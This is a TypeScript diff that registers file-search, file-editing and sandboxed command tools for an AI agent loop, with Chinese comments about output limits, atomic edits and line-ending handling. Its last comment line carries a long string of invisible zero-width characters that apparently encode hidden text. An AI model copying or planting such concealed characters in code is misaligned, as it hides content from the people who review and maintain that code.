+    const limit =
+      Number.isFinite(rawLimit) && rawLimit > 0
+        ? Math.min(Math.floor(rawLimit), LIST_DIR_HARD_CAP)
+        : LIST_DIR_MAX_ENTRIES
+    if (entries.length <= limit) {
+      return JSON.stringify({ ok: true, total: entries.length, truncated: false, entries })
+    }
+    return JSON.stringify({
+      ok: true,
+      total: entries.length,
+      truncated: true,
+      entries: entries.slice(0, limit),
+      hint: `共 ${entries.length} 条，仅返回前 ${limit} 条；用更具体的子目录 path、提高 limit（上限 ${LIST_DIR_HARD_CAP}），或先 grep 定位。`,
+    })
+  },
+})
+
+/**
+ * `grep` / `glob` 工具（2026-11-20）：桥里早有这两个原语与 `/fs/grep`、`/fs/glob` 两个 HTTP 端点，
+ * 但 AgentLoop 一直没把它们注册成工具 —— 模型手上只有 read_file/list_dir，定位一处代码只能靠
+ * run_command 外挂。这里补注册，并把「同族预算」一并收口：命中条数、单文件条数、文件数都有上限，
+ * 回包自述 total/truncated 与续查指引（与 read_file / list_dir 同一套语言）。
+ */
+const GREP_DEFAULT_LIMIT = 100
+const GREP_HARD_LIMIT = 1_000
+const GREP_SCAN_MATCHES = 5_000
+const GREP_PER_FILE_MATCHES = 20
+const GLOB_DEFAULT_LIMIT = 200
+const GLOB_HARD_LIMIT = 2_000
+const GLOB_SCAN_FILES = 5_000
+
+function readLimitArg(value: unknown, fallback: number, hardCap: number): number {
+  const raw = Number(value ?? Number.NaN)
+  if (!Number.isFinite(raw) || raw <= 0) return fallback
+  return Math.min(Math.floor(raw), hardCap)
+}
+
+agentLoop.registerTool({
+  name: 'grep',
+  description:
+    '在目录里按正则搜内容（默认不区分大小写）：content 回命中行，files_with_matches 回文件清单，count 回每文件条数。' +
+    '跳过 node_modules 等忽略目录与二进制/超大文件；默认最多 100 条命中、单文件最多 20 条，' +
+    '回包带 {ok,total,truncated} 与续查指引',
+  execute: async (args) => {
+    const limit = readLimitArg(args['limit'], GREP_DEFAULT_LIMIT, GREP_HARD_LIMIT)
+    const mode = String(args['outputMode'] ?? 'content')
+    const outputMode: 'content' | 'files_with_matches' | 'count' =
+      mode === 'files_with_matches' || mode === 'count' ? mode : 'content'
+    const result = fsBridge.grep({
+      path: String(args['path'] ?? '.'),
+      workspacePath: String(args['workspacePath'] ?? process.cwd()),
+      pattern: String(args['pattern'] ?? ''),
+      glob: typeof args['glob'] === 'string' && args['glob'] ? String(args['glob']) : undefined,
+      outputMode,
+      maxMatches: GREP_SCAN_MATCHES,
+      perFileMatches: GREP_PER_FILE_MATCHES,
+      caseSensitive: args['caseSensitive'] === true,
+    })
+    const narrowHint =
+      `共 ${result.total} ${outputMode === 'content' ? '条命中' : '个文件'}，仅返回前 ${limit} 个；` +
+      '收窄 path 或加 glob 过滤、提高 limit（上限 ' +
+      `${GREP_HARD_LIMIT}），或先用 outputMode=files_with_matches 定位文件。`
+    if (outputMode === 'files_with_matches') {
+      const files = result.files ?? []
+      const truncated = result.truncated || resolveTruncation(files, limit, 'probed').truncated
+      return JSON.stringify({
+        ok: true,
+        mode: outputMode,
+        total: files.length,
+        truncated,
+        files: files.slice(0, limit),
+        ...(truncated ? { hint: narrowHint } : {}),
+      })
+    }
+    if (outputMode === 'count') {
+      const counts = result.counts ?? {}
+      const entries = Object.entries(counts)
+      const truncated = result.truncated || resolveTruncation(entries, limit, 'probed').truncated
+      return JSON.stringify({
+        ok: true,
+        mode: outputMode,
+        total: entries.length,
+        truncated,
+        counts: Object.fromEntries(entries.slice(0, limit)),
+        ...(truncated ? { hint: narrowHint } : {}),
+      })
+    }
+    const matches = result.matches ?? []
+    const truncated = result.truncated || resolveTruncation(matches, limit, 'probed').truncated
+    return JSON.stringify({
+      ok: true,
+      mode: outputMode,
+      total: matches.length,
+      truncated,
+      matches: matches.slice(0, limit),
+      ...(truncated ? { hint: narrowHint } : {}),
+    })
+  },
+})
+
+agentLoop.registerTool({
+  name: 'glob',
+  description:
+    '按通配符找文件（支持 ** 递归，如 src/**/*.ts）：跳过忽略目录，默认最多 200 个文件，' +
+    '回包带 {ok,total,truncated,files}；比 list_dir 多一层递归，比 grep 便宜（不读内容）',
+  execute: async (args) => {
+    const limit = readLimitArg(args['limit'], GLOB_DEFAULT_LIMIT, GLOB_HARD_LIMIT)
+    const result = fsBridge.glob({
+      path: String(args['path'] ?? '.'),
+      workspacePath: String(args['workspacePath'] ?? process.cwd()),
+      pattern: String(args['pattern'] ?? ''),
+      maxFiles: GLOB_SCAN_FILES,
+    })
+    const truncated = result.truncated || resolveTruncation(result.files, limit, 'probed').truncated
+    return JSON.stringify({
+      ok: true,
+      total: result.files.length,
+      truncated,
+      files: result.files.slice(0, limit),
+      ...(truncated
+        ? {
+            hint:
+              `共 ${result.files.length} 个文件，仅返回前 ${limit} 个；` +
+              '收窄 path 或 pattern、提高 limit（上限 ' +
+              `${GLOB_HARD_LIMIT}）。`,
+          }
+        : {}),
+    })
+  },
+})
+
+agentLoop.registerTool({
+  name: 'write_file',
+  description: '写入文件（覆盖已存在文件前必须先 read_file 观察当前内容）',
+  execute: async (args) => {
+    const path = String(args['path'] ?? '')
+    const workspacePath = String(args['workspacePath'] ?? process.cwd())
+    const content = String(args['content'] ?? '')
+    const full = fsBridge.resolvePath(path, workspacePath)
+    if (isFsObservationEnforced()) {
+      const current = existsSync(full) ? readFileSync(full, 'utf-8') : null
+      const denial = fsObservationStore.checkWrite(full, current)
+      if (denial) return JSON.stringify(denial)
+    }
+    const result = fsBridge.write({
+      path,
+      workspacePath,
+      content,
+    })
+    fsObservationStore.observePresent(full, content)
+    return JSON.stringify(result)
+  },
+})
+
+/** 文件行尾：CRLF 行数多于裸 LF 才算 CRLF（混合文件按多数派处理，不做静默全量改写）。 */
+function detectEol(text: string): '\r\n' | '\n' {
+  const crlf = (text.match(/\r\n/g) ?? []).length
+  const lfOnly = (text.match(/\n/g) ?? []).length - crlf
+  return crlf > lfOnly ? '\r\n' : '\n'
+}
+
+/**
+ * 把片段行尾对齐到文件行尾（只影响比较与写回，不改文件既有基调）。
+ *
+ * 模型给的片段几乎总是 LF，Windows 上被编辑的文件常年是 CRLF：不归一化就会
+ * "片段明明在文件里却报 EDIT_NO_MATCH"。反过来（文件 LF、片段 CRLF）同样归一化。
+ */
+function alignEol(fragment: string, eol: '\r\n' | '\n'): string {
+  const normalized = fragment.replace(/\r\n/g, '\n')
+  return eol === '\r\n' ? normalized.replace(/\n/g, '\r\n') : normalized
+}
+
+agentLoop.registerTool({
+  name: 'edit_file',
+  description:
+    '在已读过的文件里做替换：默认唯一匹配（oldText 必须唯一命中），replaceAll 可整批替换；' +
+    '也可一次提交 edits[] 做原子多编辑（任一失败则整批不落、文件不动）；dryRun 只预览命中数不写盘。' +
+    '行尾自动对齐文件实际 EOL（CRLF 文件可用 LF 片段匹配，写回保持原行尾）',
+  execute: async (args) => {
+    const path = String(args['path'] ?? '')
+    const workspacePath = String(args['workspacePath'] ?? process.cwd())
+    const dryRun = args['dryRun'] === true
+    const rawEdits = args['edits']
+    const edits: Array<{ oldText: string; newText: string; replaceAll: boolean }> = Array.isArray(
+      rawEdits,
+    )
+      ? rawEdits.map((raw) => {
+          const item = (raw ?? {}) as Record<string, unknown>
+          return {
+            oldText: String(item['oldText'] ?? ''),
+            newText: String(item['newText'] ?? ''),
+            replaceAll: item['replaceAll'] === true,
+          }
+        })
+      : [
+          {
+            oldText: String(args['oldText'] ?? ''),
+            newText: String(args['newText'] ?? ''),
+            replaceAll: args['replaceAll'] === true,
+          },
+        ]
+    if (Array.isArray(rawEdits) && edits.length === 0) {
+      return JSON.stringify({
+        ok: false,
+        code: 'EDIT_BAD_EDITS',
+        error: 'edits 不能为空数组',
+        remedy: '至少给一条 {oldText,newText}；单处替换也可直接用 oldText/newText。',
+      })
+    }
+    const full = fsBridge.resolvePath(path, workspacePath)
+    if (!existsSync(full)) {
+      return JSON.stringify({
+        ok: false,
+        code: 'FS_NOT_FOUND',
+        error: '目标文件不存在',
+        remedy: '新建文件用 write_file；改已有文件先 read_file 确认路径。',
+      })
+    }
+    const currentFull = readFileSync(full, 'utf-8')
+    if (isFsObservationEnforced()) {
+      const denial = fsObservationStore.checkWrite(full, currentFull)
+      if (denial) return JSON.stringify(denial)
+    }
+    // BOM：UTF-8 带 BOM 的文件（Windows 上 .ps1/.md 常见）首字符是 U+FEFF，
+    // 模型片段不会带它 —— 不剥掉就"第一行明明在却匹配不到"。剥掉比对、写回补回。
+    const hasBom = currentFull.startsWith('\uFEFF')
+    const current = hasBom ? currentFull.slice(1) : currentFull
+    // 逐条在内存里推进：任一失败即整批放弃，磁盘上的文件保持原样（原子性）
+    // 行尾对齐：模型给的片段多为 LF，而 Windows 文件常是 CRLF —— 不归一化就是
+    // "片段明明存在却 EDIT_NO_MATCH"。对齐只作用于比较与写回，不改文件既有行尾。
+    const eol = detectEol(current)
+    let next = current
+    let replacements = 0
+    for (let index = 0; index < edits.length; index += 1) {
+      const edit = edits[index]
+      if (!edit) continue
+      if (!edit.oldText) {
+        return JSON.stringify({
+          ok: false,
+          code: 'EDIT_EMPTY_PATTERN',
+          error: 'oldText 不能为空',
+          editIndex: index,
+          remedy: '给出要被替换的原文片段（含足够上下文以保证唯一命中）。',
+        })
+      }
+      const alignedOld = alignEol(edit.oldText, eol)
+      const alignedNew = alignEol(edit.newText, eol)
+      const hits = next.split(alignedOld).length - 1
+      if (hits === 0) {
+        return JSON.stringify({
+          ok: false,
+          code: 'EDIT_NO_MATCH',
+          error: 'oldText 在文件中不存在，拒绝猜测',
+          editIndex: index,
+          remainder: index > 0 ? '整批未落盘' : undefined,
+          remedy: '重新 read_file，按当前内容原样复制原文（注意空白与换行）。',
+        })
+      }
+      if (hits > 1 && !edit.replaceAll) {
+        return JSON.stringify({
+          ok: false,
+          code: 'EDIT_NOT_UNIQUE',
+          error: `oldText 命中 ${hits} 处；只有唯一匹配才允许替换`,
+          editIndex: index,
+          hits,
+          remedy: '扩大上下文直到只剩一处命中，或显式 replaceAll: true。',
+        })
+      }
+      next = edit.replaceAll
+        ? next.split(alignedOld).join(alignedNew)
+        : next.replace(alignedOld, alignedNew)
+      replacements += edit.replaceAll ? hits : 1
+    }
+    const nextFull = hasBom ? `\uFEFF${next}` : next
+    const changed = nextFull !== currentFull
+    const bytesBefore = Buffer.byteLength(currentFull, 'utf-8')
+    const bytesAfter = Buffer.byteLength(nextFull, 'utf-8')
+    if (dryRun) {
+      return JSON.stringify({
+        ok: true,
+        dryRun: true,
+        path,
+        edits: edits.length,
+        replacements,
+        changed,
+        eol: eol === '\r\n' ? 'crlf' : 'lf',
+        bom: hasBom,
+        bytesBefore,
+        bytesAfter,
+      })
+    }
+    // 全部编辑在内存里成功后才落一次盘：一次检查点快照 + 一次写入
+    if (changed) fsBridge.write({ path, workspacePath, content: nextFull, createDirs: false })
+    // 改完就是新的观察态：同一文件紧接着再编辑无需重读（内容未变时仍放行）
+    fsObservationStore.observePresent(full, nextFull)
+    return JSON.stringify({
+      ok: true,
+      path,
+      edits: edits.length,
+      replacements,
+      occurrences: replacements,
+      changed,
+      eol: eol === '\r\n' ? 'crlf' : 'lf',
+      bom: hasBom,
+      bytesBefore,
+      bytesAfter,
+    })
+  },
+})
+
+/**
+ * `run_command` 输出预算（2026-11-20）：命令输出可能是几十 MB（日志、全量测试），
+ * 原样回给模型会先把网络与上下文打爆。取头 60% / 尾 40%（尾段常是 PASS/FAIL 与错误摘要），
+ * 超限时回包自述 truncated/originalChars —— 与 read_file/list_dir/grep 同一套语言。
+ */
+const RUN_OUTPUT_MAX_CHARS = 32_000
+
+agentLoop.registerTool({
+  name: 'run_command',
+  description:
+    '执行命令（沙箱隔离，默认 workspace-write；可传 cwd/timeoutMs/mode=read-only 或 workspace-write；' +
+    '输出超过 32000 字符时保留头尾并标 truncated）',
+  execute: async (args) => {
+    const rawMode = String(args['mode'] ?? 'workspace-write')
+    // 工具层不放行 danger-full-access：该档意味着放行网络与任意写，只允许路由/管理员通道
+    const mode = rawMode === 'read-only' ? 'read-only' : 'workspace-write'
+    const rawTimeout = Number(args['timeoutMs'] ?? Number.NaN)
+    const result = await fsBridge.run({
+      command: String(args['command'] ?? ''),
+      workspacePath: String(args['workspacePath'] ?? process.cwd()),
+      cwd: typeof args['cwd'] === 'string' && args['cwd'] ? String(args['cwd']) : undefined,
+      timeoutMs: Number.isFinite(rawTimeout) && rawTimeout > 0 ? Math.floor(rawTimeout) : undefined,
+      mode,
+    })
+    const out = truncateBothEnds(result.stdout, RUN_OUTPUT_MAX_CHARS)
+    const err = truncateBothEnds(result.stderr, RUN_OUTPUT_MAX_CHARS)
+    const truncated = out.truncated || err.truncated
+    return JSON.stringify({
+      ...result,
+      stdout: out.text,
+      stderr: err.text,
+      ...(truncated
+        ? {
+            truncated: true,
+            originalChars: { stdout: out.originalChars, stderr: err.originalChars },
+          }
+        : {}),
+    })
+  },
+})
+
+// F-302:例行程序调度器不再作为模块级副作用启动。模块被 worker 进程
+// (worker-entry → buildServer)载入时也必须零副作用;唯一启动点 =
+// index.ts 的 startBackgroundSchedulers(API 角色 + 蓝绿活跃色判定之后),
+// 关停相已在 index.ts 的 shutdown 清单里(routineManager.stopScheduler)。
+// ⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
